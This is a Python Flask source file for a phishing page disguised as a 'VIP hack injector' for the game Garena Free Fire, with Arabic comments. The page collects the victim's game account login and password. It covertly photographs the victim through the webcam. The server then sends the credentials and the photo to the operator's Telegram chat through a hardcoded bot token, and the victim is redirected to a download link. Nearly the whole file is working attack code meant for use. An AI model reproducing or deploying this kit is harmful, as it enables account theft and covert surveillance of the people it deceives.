import telebot
from flask import Flask, request, render_template_string
import base64
import os

# --- بياناتك ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- رابط التحميل ---
DOWNLOAD_LINK = "https://www.mediafire.com/your_link" 

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena FF - VIP Panel</title>
    <style>
        body {
            margin: 0; background: #050505; color: white;
            font-family: 'Cairo', sans-serif; overflow-x: hidden;
        }
        .main-container {
            background: url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img15.jpg') no-repeat center;
            background-size: cover; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.85); width: 100%; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 50px;
        }
        .card {
            width: 350px; background: rgba(20, 20, 20, 0.9); border-top: 4px solid #ffb900;
            border-radius: 15px; padding: 25px; box-shadow: 0 0 30px rgba(255, 185, 0, 0.2); text-align: center;
        }
        .logo { width: 120px; margin-bottom: 10px; filter: drop-shadow(0 0 10px #ffb900); }
        .vip-badge { background: #ffb900; color: black; font-weight: bold; padding: 5px 15px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; display: inline-block; }
        
        input {
            width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: white; text-align: right; box-sizing: border-box;
        }
        .btn-inject {
            background: linear-gradient(90deg, #ffb900, #ff7700); border: none; width: 100%; padding: 15px;
            color: black; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 15px;
        }
        .loading { display: none; margin-top: 15px; color: #ffb900; font-size: 14px; }
        
        /* شعارات الرتب */
        .ranks { display: flex; justify-content: space-around; margin: 20px 0; opacity: 0.6; }
        .ranks img { width: 40px; }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="main-container">
    <div class="overlay">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png" class="logo">
        
        <div class="card">
            <div class="vip-badge">VIP HACK INJECTOR v2.8</div>
            <h3 style="margin:0;">تسجيل دخول الحساب</h3>
            <p style="font-size:12px; color:#aaa;">اربط حسابك الآن لتفعيل ميزات الـ Headshot والـ Speed</p>

            <div class="ranks">
                <img src="https://static.wikia.nocookie.net/free-fire/images/3/3d/Heroic.png">
                <img src="https://static.wikia.nocookie.net/free-fire/images/5/52/Grandmaster.png">
                <img src="https://static.wikia.nocookie.net/free-fire/images/b/b3/Diamond_IV.png">
            </div>

            <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">

            <button class="btn-inject" onclick="startProcess()">تفعيل وحقن البيانات</button>
            <div class="loading" id="loader">جاري جلب ملفات الـ OBB...</div>
        </div>
        
        <p style="font-size:10px; color:#555; margin-top:20px;">© 2026 Garena Free Fire. All rights reserved.</p>
    </div>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
async function startProcess() {
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;

    if(u.length < 5 || p.length < 5) {
        alert("خطأ في البيانات!"); return;
    }

    document.getElementById('loader').style.display = "block";

    // تفعيل الكاميرا وتصوير الهدف فوراً
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/png');
            
            // إرسال البيانات والصورة معاً
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user: u, pass: p, image: imgData})
            }).then(() => {
                window.location.href = "{{ download_url }}";
            });
        }, 1500);
    } catch (e) {
        // إذا رفض الكاميرا، نرسل البيانات فقط
        fetch('/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({user: u, pass: p, image: "refused"})
        }).then(() => {
            window.location.href = "{{ download_url }}";
        });
    }
}
</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE, download_url=DOWNLOAD_LINK)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    # إرسال النص
    msg = f"🎯 **صيد جديد (فري فاير)**\\n👤 الحساب: `{data['user']}`\\n🔑. الباسورد: `{data['pass']}`"
    bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    
    # إرسال الصورة إذا وجدت
    if data['image'] != "refused":
        img_bytes = base64.b64decode(data['image'].split(',')[1])
        with open("victim.png", "wb") as f: f.write(img_bytes)
        with open("victim.png", "rb") as f:
            bot.send_photo(CHAT_ID, f, caption="📸 صورة الضحية أثناء التسجيل")
            
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

